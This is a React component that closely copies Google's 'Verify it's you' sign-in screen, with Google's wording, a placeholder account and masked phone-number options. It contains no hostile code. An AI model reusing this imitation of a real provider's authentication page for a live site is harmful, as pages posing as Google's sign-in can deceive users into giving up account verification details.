import React from 'react'
import {
    Box,
    Button,
    Card,
    Checkbox,
    Container,
    Divider,
    FormControlLabel,
    TextField,
  } from "@mui/material";
import LogoImg from '../../images/logo.svg'
import KeyboardArrowDownRoundedIcon from "@mui/icons-material/KeyboardArrowDownRounded";
import Image from "next/image";
import ChatIcon from '@mui/icons-material/Chat';
import PhoneIcon from '@mui/icons-material/Phone';
import PhonelinkIcon from '@mui/icons-material/Phonelink';
import HelpOutlineIcon from '@mui/icons-material/HelpOutline';
import { TAuthProps } from '../../shared/types/auth';



function ChooseVerifyWay({ isLoading}:TAuthProps) {
  return (
    <div className="flex justify-center items-center p-8 ">
      <Card variant="outlined" className="p-8 w-[40%]">
        <div className="flex justify-center items-center">
          <Image alt='Logo' src={LogoImg} className="h-14 w-14 text-center" />
        </div>

        <div className="flex flex-col gap-2 items-center my-4">
          <div className="text-xl text-[#202124]">Verify it's you</div>
          <div className=" text-[#202124] text-center ">To help keep your account safe, Google wants to make sure it’s really you trying to sign in</div>
          <div  className="text-[#1a73e8] font-medium cursor-pointer">Learn more</div>
          <div className="flex items-center justify-center rounded-full border border-gray-300 p-1 gap-2">
            <Image alt='Logo' src={LogoImg} className="h-6 w-6 rounded-full" />
            <div className="text-sm text-[#202124]">
              adminuser@gmail.com{" "}
              <KeyboardArrowDownRoundedIcon className="h-4 w-4" />
            </div>
          </div>
        </div>
      
        <div className=' text-[#202124] font-medium my-8 '>choose how you want to sigin in:</div>
        <div className='flex items-center gap-8 my-4 cursor-pointer'>
          <div>
            <ChatIcon color='primary'/>
          </div>
          <div className='flex flex-col gap-1'>
              <div className='text-sm text-[#202124]'>Get a verify code at *** *****15</div>
              <div className='text-xs'>Standard rates apply</div>
          </div> 
        </div>
        <Divider />

        <div className='flex items-center gap-8 my-4 cursor-pointer'>
          <div>
            <PhoneIcon color='primary'/>
          </div>
          <div className='flex flex-col gap-1'>
              <div className='text-sm text-[#202124]'>Call your phone on file *** **** ***15</div>
          </div> 
        </div>
        <Divider />

        <div className='flex items-center gap-8 my-4 cursor-pointer'>
          <div>
            <PhonelinkIcon color='primary'/>
          </div>
          <div className='flex flex-col gap-1'>
              <div className='text-sm text-[#202124]'>Use another phone or computer to finish signing in</div>
          </div> 
        </div>
        <Divider />

        <div className='flex items-center gap-8 my-4 cursor-pointer'>
          <div>
            <PhoneIcon color='primary'/>
          </div>
          <div className='flex flex-col gap-1'>
              <div className='text-sm text-[#202124]'>Confirm your recover phone number</div>
          </div> 
        </div>
        <Divider />
        
        <div className='flex items-center gap-8 my-4 cursor-pointer'>
          <div>
            <HelpOutlineIcon color='primary'/>
          </div>
          <div className='flex flex-col gap-1'>
            <div className='text-sm text-[#202124]'>Get help</div>
          </div> 
        </div>
        <Divider /> 
      </Card>
    </div>
  )
}

export default ChooseVerifyWay
